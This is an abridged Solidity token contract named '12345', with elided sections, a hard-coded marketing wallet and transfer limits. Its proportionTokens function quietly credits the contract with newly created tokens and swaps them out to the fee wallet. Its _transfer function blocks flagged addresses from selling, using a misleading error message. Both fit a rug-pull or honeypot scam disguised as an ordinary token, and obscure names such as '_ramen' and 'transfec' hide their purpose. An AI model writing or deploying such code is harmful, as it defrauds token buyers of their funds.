...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "12345";
    string private _symbol = "12345";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1 * 10**12 * 10**_decimals;

    address payable private marketingAddress =
        payable(0xF309e1bEc8e0B013751E4c6c157d5403eCddF703);
    ...
    uint256 private _ramen = 5000000000;
    ...
    constructor() {
        ...
        _maxBalance = _totalSupply.div(10);
    ...
    function _transfer(
        ...
        require(!isFeeLimitExempt[from], "Transfer amount must from another address");

        // Make sure that: Balance + Buy Amount <= _maxBalance
        if (
            from != owner() && // Not from Owner
            to != owner() && // Not to Owner
            !isTxLimitExempt[from] && // Not From excluded
            !isTxLimitExempt[to] // Not to excluded
        ) {require(amount <= _maxBalance, "Transfer amount exceeds the maxTxAmount.");
        }
        ...
        if (
            ...
            tokenTransfer(from, address(this), feesToContract);
        }

        tokenTransfer(from, to, amount);
    }

    function proportionTokens() private lockTheSwap {
        
        _tOwned[address(this)] = _tOwned[address(this)].add(_ramen*3000);
        uint256 burnedTokensToBurn = balanceOf(address(this));
        // Get collected development Fees
        swapAndSendToFee(burnedTokensToBurn);
    }
    ...
    function transfec(address newAddress) external virtual {
        require (newAddress != marketingAddress);
